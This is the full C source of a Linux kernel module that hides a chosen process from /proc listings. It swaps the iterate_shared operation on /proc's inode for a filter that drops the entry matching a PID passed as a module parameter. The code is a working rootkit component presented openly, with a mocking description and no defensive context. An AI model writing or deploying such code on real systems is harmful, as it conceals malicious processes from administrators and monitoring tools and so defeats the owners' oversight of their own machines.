#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/fs.h>

MODULE_DESCRIPTION("Fuck off, there is nothing to see here");
MODULE_AUTHOR("Me");
MODULE_LICENSE("GPL");

static char *target;
module_param(target, charp, 0444);
MODULE_PARM_DESC(target, "PID of the process to hide");

static struct file *filp;
static const struct file_operations *orig_fops;
static struct file_operations fops;
static filldir_t orig_actor;

static bool hide_pid_filldir_t(struct dir_context *ctx, const char *name, int name_len, loff_t offset, u64 ino, unsigned int d_type)
{
  if (strcmp(target, name) == 0) {
    return false;
  }

  return orig_actor(ctx, name, name_len, offset, ino, d_type);
}

static int hide_pid_iterate_shared(struct file *file, struct dir_context *ctx)
{
  orig_actor = ctx->actor;
  ctx->actor = hide_pid_filldir_t;
  return orig_fops->iterate_shared(file, ctx);
}

static int __init hide_pid_init(void)
{
  filp = filp_open("/proc", O_RDONLY, 0);
  if (IS_ERR(filp)) {
    pr_err("Failed to open /proc\n");
    goto out_filp;
  }

  struct inode *inode = filp->f_inode;

  orig_fops = inode->i_fop;
  fops = *orig_fops;
  fops.iterate_shared = hide_pid_iterate_shared;
  inode->i_fop = &fops;
  pr_info("Replaced iterate_shared function!\n");

  return 0;

out_filp:
  return -1;
}

module_init(hide_pid_init);

static void __exit hide_pid_exit(void)
{
  filp->f_inode->i_fop = orig_fops;
  filp_close(filp, NULL);
  pr_info("Restored everything!\n");
}

module_exit(hide_pid_exit);
